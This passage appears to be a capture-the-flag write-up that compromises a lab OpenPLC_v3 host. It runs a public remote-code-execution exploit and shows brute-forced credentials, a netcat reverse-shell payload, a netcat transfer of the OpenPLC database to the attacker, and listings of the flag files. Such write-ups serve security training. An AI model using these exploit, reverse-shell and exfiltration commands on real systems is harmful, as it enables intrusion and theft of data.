...
```bash
python3 49803.py -u http://open.nyx:8080 -l openplc -p openplc -i 10.0.2.15 -r 9002

[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.0.2.47:8080 is Up...
[+] Host Up! ...
...
[DATA] attacking http-get://10.0.2.47:7681/
[7681][http-get] host: 10.0.2.47   login: tirex   password: heaven
...
> **Payload:** `busybox nc 10.0.2.15 9001 -e /bin/sh`
...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.47] 40514
id
...
total 4
drwx------ 3 tirex tirex 4096 ago 22  2025 tirex
tirex@open:~$ ls -l /home/tirex/
total 4
-r-------- 1 tirex tirex 33 ago 22  2025 user.txt
...
```bash
# Victim Machine
nc 10.0.2.15 9005 < /opt/OpenPLC_v3/webserver/openplc.db

# Attacker Machine
nc -lvp 9005 > openplc.db
```
...
total 4
-r-------- 1 root root 33 ago 22  2025 root.txt
